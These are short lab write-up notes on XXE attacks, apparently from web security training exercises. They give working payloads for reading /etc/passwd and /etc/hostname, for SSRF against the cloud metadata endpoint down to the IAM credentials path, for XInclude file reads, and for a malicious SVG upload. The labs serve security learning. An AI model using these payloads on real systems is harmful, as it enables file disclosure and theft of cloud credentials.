## Lab: Exploiting XXE using external entities to retrieve files

We are in home page

![Alt text](img.png)

Then click view details of any product

![Alt text](img-1.png)

-> Check stock

We open burpsuite to view request

![Alt text](img-3.png)

-> XML, so we inject

```xml
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
```

![Alt text](img-2.png)

## Lab: Exploiting XXE to perform SSRF attacks


We add external entity

```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/"> ]>
```

and replace productId with `&xxe;`

![Alt text](image-2.png)

and result

![Alt text](image-3.png)

we change external entity

```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/"> ]>
```

![Alt text](image-4.png)

Continue, and external entity:

```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin"> ]>
```

```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data"> ]>
```

![Alt text](image-5.png)

## Lab: Exploiting XInclude to retrieve files

![Alt text](image.png)

Set value of productId:

```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>
```

![Alt text](image-1.png)

## Lab: Exploiting XXE via image file upload

We upload a svg image

![Alt text](image-6.png)

Then we create a svg file:

```xml
<?xml version="1.0" standalone="yes"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]><svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1"><text font-size="16" x="0" y="16">&xxe;</text></svg>
```

![Alt text](image-7.png)

![Alt text](image-8.png)